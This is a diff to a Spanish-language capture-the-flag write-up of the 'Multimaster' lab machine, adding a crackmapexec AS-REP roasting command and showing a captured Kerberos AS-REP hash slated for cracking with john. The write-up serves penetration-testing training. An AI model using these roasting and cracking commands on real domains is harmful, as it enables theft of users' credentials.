@@ -833,7 +833,7 @@ Para lograr esto vamos a actualizar nuestra herramienta.
 # Actualizando el script.
 
 
-Creamos una variable global e importamos la librería `re` y `pwn`.
+Creamos una variable global que almacene el SID del dominio e importamos la librería `re` y `pwn`.
 
 ```python
 import re
@@ -1225,6 +1225,13 @@ jorden  CN=Developers,OU=Groups,DC=MEGACORP,DC=LOCAL  2020-01-09 18:48:17.503303
 
 $krb5asrep$23$jorden@MEGACORP.LOCAL:953abf0472fafe61916ce77ac7e6ebc5$984cc9f4b101ba52c0b77334950ed13f88c489efadcd76979d911e4b6dc18cf7439dbf3133d3e9d2f6e3a9f5090cf4c3bd30efebe2da216142793ea7b00be97b12a295ce7a9d1691d3a3680dd38a3cdb18486d657caf6eaae62ca26698c2882f5bd0b2ea354d55c26277106e3dfeb5390860dc5f1ba41b6c2adb44fe07b1d03f161c6085d34538b24228d49bc65c81b79e51fd8599f74f5fb8c8563b02b10da882666506979d287a2cd79c28b9b9ae5f7997517903993d05e3bb7a6c68744f9592ca21cc85c315dc962be07c5391fc1b856a883a42eb408d7e41ace9e61084a63ec89cddbe3ab1bbd44fa85e4b9eb25e
 ```
+
+O bien con crackmapexec.
+
+```console
+intrusionz3r0@kali:~$ cme ldap multimaster.htb -u jorden -p '' --asreproast AR_REP --kdcHost 10.10.10.179
+```
+
 Ahora solo lo crackeamos el hash con nuestro amigo john y verificamos las credenciales con crackmapexec.
 
 ```console
